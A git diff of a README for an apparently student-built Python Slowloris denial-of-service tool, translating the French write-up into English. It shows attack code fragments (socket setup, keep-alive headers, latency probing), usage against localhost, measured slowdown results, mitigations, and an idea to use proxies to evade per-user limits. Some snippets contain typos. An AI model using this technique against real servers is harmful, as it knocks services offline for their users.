@@ -1,166 +1,143 @@
-# Python pour la securite
-  - ### [1. Introduction](#1-Introduction)
-  - ### [2. Fonctionnement](#2-Fonctionnement)
-  - ### [3. Resultat](#3-Resultat)
-  - ### [4. Difficultees rencontrees](#4-Difficultees-rencontrees)
-  - ### [5. Ameliorations](#5-Ameliorations)
-  - ### [6. Conclustion](#6-Conclusion)
+The Slowloris attack allows a user to DDOS a server using only one machine. It tries to keep as many connections open with the target web server as possible and tries to keep them open as long as possible. As soon as Slowloris has opened a connection, it will keep it open by sending incomplete requests that it will slowly complete as it goes along but will never finish them. Affected servers will see their maximum number of connections reached and may refuse new user connections.
 
----
-## 1. Introduction
+The servers mostly affected by the Slowloris attack are:
 
- L'attaque slow loris permet de faire un ddos sur un serveur en se servant que d'une seule machine. 
- Slowloris essaie de garder le maximum de connexions ouvertes avec le webserver cible et essaie de les garder ouvertes aussi longtemps que possible. 
- Dès que le slowloris a ouvert une connection il va garder la garder ouverte en envoyant des requêtes incomplètes qu'il va compléter lentement au fur et à mesure mais ne les finira jamais. 
- Les serveurs affectés verront leur nombre maximum de connections atteint et peuvent refuser les nouvelles connections d'utilisateurs.
-Les serveurs majoritairement touchés par l'attaque slowloris sont:
 - Apache 1.x and 2.x
 - dhttpd
 - Flask
+There are modules for Apache that reduce the chance of a Slowloris attack such as:
 
-Il existe des modules pour apache qui permetent de réduire la chance d'une attaque slowloris tel que: 
 - mod_limitipconn
 - mod_qos, mod_evasive
 - mod security
 - mod_noloris
 - mod_antiloris
 
-Il existe d'autres méthodes pour se protéger tel qu'installer un:
+There are other methods to protect yourself, such as installing a:
+
 - reverse proxy
 - firewall
 - load balancer
 - content switches
+If none of these solutions are available, it is always possible to place your web server behind an Nginx or lighthttpd.
 
-Si aucune de ces solutions n'est envisageable il est toujours possible de placer son webserver derrière un nginx ou lighthttpd qui ne sont pas affectés par cette attaque.
+## How it works
+It is necessary to install some dependencies. The commands to be executed to have an execution environment are the following:
 
----
-## 2. Fonctionnement
-Afin de faire fonctionner ce programme, il est necessaire d'installer certaines dependances. Les commandes a executer pour avoir un environnement d'execution sont les suivantes :
- * `virtualenv env`
- * `source env/bin/activate`
- * `pip install -r requirements.txt`
+```Python
+virtualenv env
+source env/bin/activate
+pip install -r requirements.txt
+```
+Then it is possible to choose some options:
 
- Ensuite il est possible de choisir certaines options:
- - a: Host to perform attack on, default localhost
- - p: Port of the server, default = 80
- - s: Max socket to use
- - d: Debug mode
+- a: Host to perform an attack on, default localhost
+- p: Port of the server, default = 80
+- s: Max socket to use
+- d: Debug mode
 
+First of all, it is necessary to retrieve the type of server you want to attack. For example, an apache 1.x/2.x server will allow an optimal attack.
 
- Dans un premier temps, il est necessaire de recuperer le type de serveur que l'on souhaite attaquer : 
- * Par exemple, un serveur apache 1.x/2.x permettra une attaque optimal.
- * A contrario, attaquer un WebServeur tournant avec le framework NodeJS a partir de la version 8 est inutile
+On the other hand, attacking a WebServer running with the NodeJS framework from version 8 is useless.
 
- Pour recuper le type de serveur, on envoie une requete get : </br>
- * `sock.send("GET / HTTP/1.1\r\n\r\n".encode("ascii"))`</br>
+To retrieve the type of server, we send a get request:
+```Python
+sock.send("GET / HTTP/1.1\r\n\n".encode("ascii"))
+```
+Then we analyze the answer.
 
-Puis on analyse le retour </br>
-*  `HTTP/1.1 400 Bad Request
-Date: Wed, 10 Jul 2019 16:18:53 GMT
-Server: Apache/2.4.29 (Ubuntu)
-Content-Length: 301
-Connection: close
-Content-Type: text/html; charset=iso-8859-1
-`
+```Python
+HTTP/1.1 400 Bad Request Date: Wed, 10 Jul 2019 16:18:53 GMT Server: Apache/2.4.29 (Ubuntu) Content-Length: 301 Connection: close Content-Type: text/html; charset=iso-8859-1
+```
 
-Pour l'initialisation des sockets on envoie trois requêtes:
+For the initialization of the sockets three requests are sent:
+
 ```Python
 s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000).encode("utf-8"))
 s.send("User-Agent: {}\r\n".format(ua.USER_AGENT[random.randin(0,29)]).encode("utf-8"))
 s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5".encode("utf-8"))
 ```
-Dans l'ordre:
-- La première initialise la connection
-- La deuxième envoie le user agent utilisé choisi aléatoirement dans la pool des user agents.
-- La troisième dit quelles sont les langues acceptées.
+The first one initiates the connection
+The second one sends the user agent used randomly chosen from the user agent pool.
+The third one says which languages are accepted.
+On initialization, the Slowloris will try to initiate as many connections as requested.
 
--> A l'initialisation le slowloris va essayer d'initier autant de connections que l'on a demandé.
+It will then keep them alive by completing them every 15 seconds with:
 
-Il va ensuite les garder en vie en les complétant toutes les 15 secondes avec:
 ```Python
 s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
 ```
-Il va ensuite essayer à nouveau d'ouvrir des connections jusqu'à atteindre la limite que l'on a fixé.
- ```Python
- for _ in range(self.target_info.sockets_number - len(self.sockets_list)):
+It will then try to open connections again until he reaches the limit we have set.
+```
+for _ in range(self.target_info.sockets_number - len(self.sockets_list)):
     try:
         s = self.init_socks()
         if s:
             self.sockets_list.append(s)
 ```
-Par la suite le slowloris va calculer la latence en faisant une requête dans un thread à part.
+Then the Slowloris will calculate the latency by requesting a separate thread.
 
 ```Python
 response = requests.get(self.url).elapsed.total_seconds()
 ```
-La request fait un get sur l'host rentree par l'utilisateur et recupere le temps entre l'envoie et la reponse de la requete.
+The request makes a get on the host entered by the user and retrieves the time between sending and answering the request.
+
+## Results
+The results below were performed on an Apache server with the initial configuration.
+
+The program ran with the following command:
+
+`python src/main.py -a 127.0.0.1 -s 1000`
+At first, the console shows us that we are on an Apache server, which is perfect for our attack.
+
+`[127.0.0.1] server running with Apache, best configuration for this attack`
+In the second step, the initial latency is displayed:
+
+`[Latency] -- 0.002142`
+
+It is therefore noticeable that the latency time is relatively low.
+
+Then we initialize the maximum socket.
+
+`279 connections 1000 initialized`
+
+We notice here that we managed to initialize only 279 sockets out of 1000 planned. We now try to keep them open as long as possible.
+
+After 15 seconds, we try to create new connections to reach 1000 open connections.
+
+After 5 minutes, you can see that we have 408 open sockets.
+
+`408 connections 1000 initialized`
+
+There is also a 15-second latency proof that denial of service works.
+
+`[Latency] -- 15.80608`
+After 10 minutes, the program is stopped so that you can see an average latency of 14.7 seconds.
+
+**Average latency = 14.7025671999999999999**
 
 
----
-
-## 3. Resultat
-Les resultat ci dessous ont ete effectue sur un serveur Apache avec la configuration initiale.</br>
-Le programme fut lance avec la commande suivante : `python src/main.py -a 127.0.0.1 -s 1000`
-
-
-Dans un premier temps la console nous affiche que l'on se trouvre sur un seveur Apache, ce qui est parfait pour notre attaque : 
-> `[127.0.0.1] server running with Apache, best configuartion for this attack`
-
-Dans un second temps, on affiche la latence initial :
-> `[Latency] -- 0.002142`
-
-On remarque donc que le temps de latence est relativement faible. </br></br>
-Ensuite on initialise le maximum de socket 
-> `279 connections 1000 initialised`
-
-On remarque ici que l'on a reussi a initialiser seulement 279 sockets sur les 1000 prevu, on essaie maintenant de les garder ouvertes le plus longtemps possible.
-
-Apres 15 secondes, on essaie d'en recreer afin d'atteindre les 1000
-> `try recreating sockets`
-
-Apres 5 minutes, on peut voir que l'on a 408 sockets qui sont ouvertes
-> ` 408 connections 1000 initialised `
-
-On remarque aussi une latence de 15 secondes, preuve que le deni de service fonctionne.
-> `[Latency] -- 15.80608   `
-
-Apres 10 minutes, on stop le programme, on peut donc voir une latence moyenne de 14.7 secondes.
-> `Average latency = 14.702567199999999`
-
-
----
-
-[Just a moment...](https://cdn1.imggmi.com/uploads/2019/7/10/cca68682fe9aa44435fa77cb9439f596-full.png)
-On peut voir en haut le spinner qui tourne et en bas la requête connexion
-
-Egalement quand on essaie de lancer un autre slowloris sur le même serveur alors qu'il y a déjà un slowloris qui tourne celui-ci ne marche pas car il n'arrive pas à établir une nouvelle connection.
+When you try to launch another Slowloris on the same server when there is already a Slowloris running, it won't succeed because the number of open connections is already maxed out.
 
 ```Bash
-(env) ➜  slowAttack git:(master) ✗ python src/main.py -a 127.0.0.1
+(env) ➜ slow attack git:(master) ✗ python src/main.py -a 127.0.0.1
 19:30:51 - Slow Loris Attack Started
-19:30:54 - No Webserver detected, please verify your target adresse
+19:30:54 - No Webserver detected, please verify your target address
 ```
+## Difficulties
+The main challenge was hardware, trying the attack on a remote server. The internet box "banned" me. It was impossible to access any website outside, impossible to use a DNS.
 
 
-## 4. Difficultees rencontrees
+The second difficulty was to understand that the nodes' servers were not affected. The program seemed to work, but no slowdowns observed.
 
-La principale difficultees fut d'ordre materiel, en essayant l'attaque sur un serveur distant, la box internet ma "banni", il etait impossible d'acceder a aucun site web en dehors, impossible d'utiliser un dns.
+## Room for Improvement
+There is much room for improvement:
 
-La seconde difficultee fut de comprendre que les serveur nodes n'etaient pas affectees. Le programme semblait fonctionel mais aucun ralentissement ne fut observé. Ensuite installer un serveur apache est un defi de taille.
+- Automatic detection of the server and optimization of the parameters.
+- Automatic detection of server timeout for requests.
+- Detection of the maximum number of server connections to be able to choose the level of DDoS you want (a little, a lot, medium).
+- Use of proxies to allow more connections when there is a limited number of connections per user.
 
-Hormis cela, aucune difficultée majeures ne fut rencontrées.
+The Slowloris attack is exciting if the webserver is vulnerable to this attack because it allows a single computer to easily DDoS a server. However, it is easy to protect yourself against these attacks by implementing a few rules: a limited number of sockets per user, firewall, reverse proxy, etc..
 
-
-## 5. Ameliorations
-Les améliorations possibles sont nombreuses:
-- Détection automatique du serveur et optimisation des paramètres.
-- Détection automatique du timeout serveur pour les requêtes.
-- Détection du nombre de connection maximum du serveur pour pouvoir choisir le niveau de ddos que l'on veut (un peu, beaucoup, moyen)
-- Utilisation de proxy pour permettre d'ouvrir un plus grand nombre de connections quand il y a un nombre limité par utilisateur.
-
-## 6. Conclusion
->L'attaque du slowloris est une attaque très intéressante si jamais le serveur web est vulnérable à cette attaque car elle permet à un seul ordinateur de facilement ddos un serveur.
-Cependant il s'avère qui est facile de se protéger face à ses attaques en implémentant quelques règles: nombres de socket par utilisateur limités, firewall, reverse proxy, etc.
-
-## 7 TODO
-- [ ] Translate to english
+Thanks to Quentin Derosin for the help on this project.
